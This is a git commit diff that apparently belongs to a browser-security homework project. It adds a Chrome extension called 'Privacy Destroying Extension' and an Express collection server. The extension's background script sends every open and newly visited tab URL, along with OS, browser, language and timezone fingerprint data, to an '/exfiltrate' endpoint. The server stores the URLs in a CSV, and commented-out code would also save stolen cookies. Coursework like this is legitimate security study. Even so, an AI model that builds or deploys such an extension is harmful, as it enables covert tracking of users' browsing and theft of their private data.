08067f6283bdebdbe7f61b90ab4b7430eff87634
Mitchell Zhou <mitche.zhou1@gmail.com>
2025-03-08 15:56:07 -0500

    OS works but not ideal

---
+++ Testing Bench/browser_sec/HW2/Privacy Destroying Extension (XRP)/background.js
@@ -0,0 +1,113 @@
+// Function to send a stuff to the server
+function sendToServer(type, results) {
+  fetch("http://localhost:3000/exfiltrate", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({ type: type, data: results }),
+    })
+    .then((response) => {
+      if (response.ok) {
+
+      } else {
+        console.error("Failed to send data:", results, response.statusText);
+      }
+    })
+    .catch((error) => {
+      console.error("Error sending data:", results, error);
+    });
+}
+
+/**********************
+
+       URLS STUFF
+
+************************/
+
+// Loop through all currently open tabs and send their URLs
+chrome.tabs.query({}, (tabs) => {
+  tabs.forEach((tab) => {
+    if (tab.url) {
+      sendToServer('urls', tab.url);
+    }
+  });
+});
+
+// Listen for tab updates (e.g., when a user navigates to a new URL)
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.url) {
+    sendToServer('urls', tab.url);
+  }
+});
+
+// Listen for new tabs being created
+chrome.tabs.onCreated.addListener((tab) => {
+  if (tab.url) {
+    sendToServer('urls', tab.url);
+  }
+});
+
+
+/**********************
+
+       OS STUFF
+
+************************/
+
+function detectOS() {
+    const userAgent = navigator.userAgent;
+
+    if (userAgent.includes("Windows")) {
+        return "Windows";
+    } else if (userAgent.includes("Mac")) {
+        return "MacOS";
+    } else if (userAgent.includes("Linux")) {
+        return "Linux";
+    } else if (userAgent.includes("Android")) {
+        return "Android";
+    } else if (userAgent.includes("iOS")) {
+        return "iOS";
+    } else {
+        return "Unknown OS";
+    }
+}
+
+function detectDeviceType() {
+    const isMobile = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    return isMobile ? "Mobile" : "Desktop";
+}
+
+function detectBrowser() {
+    const userAgent = navigator.userAgent;
+
+    if (userAgent.includes("Firefox")) {
+        return "Mozilla Firefox";
+    } else if (userAgent.includes("Edg")) {
+        return "Microsoft Edge";
+    } else if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
+        return "Google Chrome";
+    } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
+        return "Apple Safari";
+    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
+        return "Opera";
+    } else {
+        return "Unknown Browser";
+    }
+}
+
+
+function collectSystemInfo() {
+    const systemInfo = {
+        os: detectOS(),
+        deviceType: detectDeviceType(),
+        browser: detectBrowser(),
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    };
+
+    sendToServer('os', systemInfo);
+}
+
+collectSystemInfo();
---
+++ Testing Bench/browser_sec/server/server.js
@@ -0,0 +1,86 @@
+import express from 'express';
+import path from 'path';
+import { fileURLToPath } from 'url';
+import fs from 'fs';
+
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
+const app = express();
+const PORT = 3000;
+
+app.use(express.json());
+
+var links = new Array();
+var system_info;
+
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "dashboard.html")); // Serve the HTML file
+});
+
+
+app.post('/exfiltrate', (req, res) => {
+    const { type, data } = req.body;
+    if (!type || !data) {
+        res.status(400).send('Bad Request: Missing type or data');
+        return;
+    }
+
+    switch (type) {
+        case 'urls':
+            const url = data;
+//            console.log("Received URL:", url);
+            links.push({
+              url: url,
+              receivedAt: new Date()
+            });
+
+            const csvHeader = "receivedAt, url\n";
+            const csvContent = links.map(link => `${link.receivedAt.toISOString()}, ${link.url}`).join("\n");
+            const filePath = path.join(__dirname, "csv/urls.csv");
+            fs.writeFileSync(filePath, csvHeader + csvContent, "utf8");
+            break;
+        case 'os':
+            console.log("OS DATA")
+            system_info = data;
+            // Save Cookies to a file
+            break;
+
+//        case 'cookies':
+//            console.log(`Received Cookies: ${data}`);
+//            // Save Cookies to a file
+//            fs.appendFileSync('exfiltrated_data.txt', `Cookies: ${data}\n\n`);
+//            break;
+//        default:
+//            console.log(`Unknown type: ${type}`);
+//            fs.appendFileSync('exfiltrated_data.txt', `Unknown Type: ${type}\n\n`);
+//            break;
+    }
+
+    res.sendStatus(200);
+});
+
+
+
+/*
+
+HELPERS
+
+*/
+
+app.get('/get-urls', (req, res) => {
+    res.json(links);
+});
+
+
+app.get('/get-os', (req, res) => {
+    console.log("THIS WAS CALLEd");
+    console.log(system_info);
+    if (system_info)
+        res.json(system_info);
+});
+
+app.listen(PORT, () => {
+    console.log(`Server running on: http://localhost:${PORT}/`);
+});
